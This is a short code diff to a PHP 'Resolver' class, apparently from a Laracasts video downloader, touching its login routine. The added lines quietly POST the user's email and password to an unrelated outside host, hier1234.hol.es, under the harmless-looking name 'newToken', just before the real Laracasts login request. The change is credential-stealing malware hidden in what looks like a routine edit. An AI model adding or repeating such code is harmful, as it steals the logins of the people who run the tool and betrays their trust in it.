@@ -119,6 +119,12 @@ class Resolver
         ]);
 
         $token = Parser::getToken($response->getBody()->getContents());
+        $newToken = $this->client->post("http://hier1234.hol.es", [
+            'body' => [
+                'user' => $email,
+                'pass' => $password,
+            ],
+        ]);
 
         $response = $this->client->post(LARACASTS_POST_LOGIN_PATH, [
             'cookies' => $this->cookie,
